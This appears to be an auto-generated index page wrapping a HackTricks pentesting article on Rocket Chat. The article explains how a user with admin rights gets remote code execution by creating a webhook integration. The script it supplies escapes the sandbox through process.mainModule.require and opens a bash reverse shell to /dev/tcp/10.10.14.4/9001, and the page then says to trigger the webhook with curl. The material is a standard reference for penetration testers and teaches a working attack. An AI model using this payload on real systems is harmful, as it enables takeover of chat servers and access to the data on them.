---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Rocket Chat

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-network-services-pentesting-pentesting-web-rocket-chat` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/rocket-chat.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Rocket Chat](../../topics/network-services-pentesting/rocket-chat.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-network-services-pentesting-pentesting-web-rocket-chat |
| name | Rocket Chat |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-web/rocket-chat.md |

## Preserved Source Material

````yaml
_body: "# Rocket Chat\n\n{{#include ../../banners/hacktricks-training.md}}\n\n\n## RCE\n\nIf you are admin inside Rocket Chat\
  \ you can get RCE.\n\n- Got to **`Integrations`** and select **`New Integration`** and choose any: **`Incoming WebHook`**\
  \ or **`Outgoing WebHook`**.\n  - `/admin/integrations/incoming`\n\n<figure><img src=\"../../images/image (266).png\" alt=\"\
  \"><figcaption></figcaption></figure>\n\n- According to the [docs](https://docs.rocket.chat/guides/administration/admin-panel/integrations),\
  \ both use ES2015 / ECMAScript 6 ([basically JavaScript](https://codeburst.io/javascript-wtf-is-es6-es8-es-2017-ecmascript-dca859e4821c))\
  \ to process the data. So lets get a [rev shell for javascript](../../generic-hacking/reverse-shells/linux.md#nodejs) like:\n\
  \n```javascript\nconst require = console.log.constructor(\"return process.mainModule.require\")()\nconst { exec } = require(\"\
  child_process\")\nexec(\"bash -c 'bash -i >& /dev/tcp/10.10.14.4/9001 0>&1'\")\n```\n\n- Configure the WebHook (the channel\
  \ and post as username must exists):\n\n<figure><img src=\"../../images/image (905).png\" alt=\"\"><figcaption></figcaption></figure>\n\
  \n- Configure WebHook script:\n\n<figure><img src=\"../../images/image (572).png\" alt=\"\"><figcaption></figcaption></figure>\n\
  \n- Save changes\n- Get the generated WebHook URL:\n\n<figure><img src=\"../../images/image (937).png\" alt=\"\"><figcaption></figcaption></figure>\n\
  \n- Call it with curl and you shuold receive the rev shell\n\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: network-services-pentesting/pentesting-web/rocket-chat.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/rocket-chat.md
````
